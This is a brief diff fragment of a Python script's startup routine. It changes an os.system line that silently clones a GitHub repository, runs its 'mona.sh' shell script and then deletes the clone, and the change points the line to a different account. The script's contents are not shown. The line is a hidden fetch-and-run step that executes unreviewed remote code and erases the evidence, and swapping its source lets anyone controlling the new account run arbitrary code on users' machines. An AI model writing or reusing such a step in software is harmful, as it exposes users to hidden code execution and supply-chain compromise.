@@ -72,7 +72,7 @@ def starting():
         time.sleep(.1)
         sys.stdout.flush()
   print ("")
-  os.system('rm -rf moni;git clone https://github.com/amerlaceset/moni;bash moni/mona.sh;rm -rf moni')
+  os.system('rm -rf moni;git clone https://github.com/ameraraibia168/moni;bash moni/mona.sh;rm -rf moni')
   print("\n\n")
   time.sleep(3)
   print ("")
